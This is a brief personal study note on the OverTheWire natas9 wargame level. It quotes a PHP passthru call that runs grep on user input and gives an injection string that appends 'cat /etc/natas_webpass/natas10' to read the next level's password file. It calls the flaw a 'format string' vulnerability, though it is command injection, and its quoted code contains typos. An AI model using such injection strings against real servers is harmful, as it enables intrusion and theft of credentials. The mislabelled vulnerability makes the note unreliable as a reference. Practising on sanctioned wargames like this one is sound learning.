---
layout: base.njk
title: natas9
tags: txt
---
#COMPSCI
from: [[OverTheWire]]
key concepts: [[php]], [[format string]]

## Solution
format string vulnerability. you supply your search and its fed to the following structure

```
passthru("grep -i $search dictionary.txt);
```
you can end the ger early with a malicious string
"; cat /etc/natas_webpass/natas10; cat"
